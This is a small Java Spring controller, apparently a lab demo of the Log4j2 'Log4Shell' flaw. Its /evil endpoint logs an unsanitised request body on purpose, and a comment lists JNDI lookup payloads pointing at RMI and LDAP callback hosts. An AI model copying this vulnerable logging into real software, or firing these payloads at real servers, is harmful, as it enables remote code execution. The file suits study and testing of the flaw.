package com.itpkm.springmvclog4j2.controller;


import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

/**
 * 正常业务Controller类
 *
 * @author itpkm
 */
@RestController
@Slf4j
public class BusinessAppController {

    /**
     * 测试SpringMVC服务可用性与简易信息提取
     *
     * @param userName
     * @return
     */
    @PostMapping("/hello")
    public String hello(String userName) {
        log.info("获取信息, {}", "${java:vm}");
        log.info("获取信息, {}", "${java:os}");
        log.info("Hi，welcome!");

        return String.format("你好 {}，欢迎您到来！", userName);
    }

    /**
     * 测试应用被植入攻击型日志
     *
     * @param requestBody 供给范例如下：
     *                    //${java:vm}
     *                    //${os:name}
     *                    //${java:version}
     *                    //${jndi:rmi://{ip}:{port}/evil}
     *                    //${jndi:ldap://b3u3d6.dnslog.cn}
     * @return
     */
    @PostMapping("/evil")
    public String evil(@RequestBody String requestBody) {
        System.out.printf("1.后端应用接收前端恶意请求, %s%s", requestBody, "\n");
        System.out.printf("2.开始执行log4j2日志打印, >>>>>>>>>>>>>>>%s", "\n\n");
        log.info("3.【本地日志：正常应用服务器日志片段】, 【远程执行：{}】,{}", requestBody, "\n");
        System.out.printf("4.log4j2 日志打印执行结束, >>>>>>>>>>>>>>>%s", "\n\n");

        return "success!";
    }

}
